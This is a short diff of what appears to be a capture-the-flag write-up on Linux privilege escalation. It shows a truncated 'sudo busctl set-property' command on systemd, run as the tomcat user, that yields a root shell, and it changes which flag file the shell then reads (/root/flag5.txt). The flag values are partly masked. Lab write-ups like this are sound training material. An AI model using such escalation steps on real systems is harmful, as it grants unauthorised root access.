@@ -252,13 +252,9 @@ tomcat@nix03:/var/lib/tomcat9$ sudo busctl set-property org.freedesktop.systemd1
 # whoami
 whoami
 root
-# ls
-ls
-conf  flag4.txt  lib  logs  policy  webapps  work
-# cat flag4.txt
-cat flag4.txt
-LLPE{iXXXXXXXXXXXXXXXXw}
-# 
+# cat /root/flag5.txt
+cat /root/flag5.txt
+LLPE{0nXXXXXXXXXXXXXXXXXXXXll!}
 ```
 
 ---
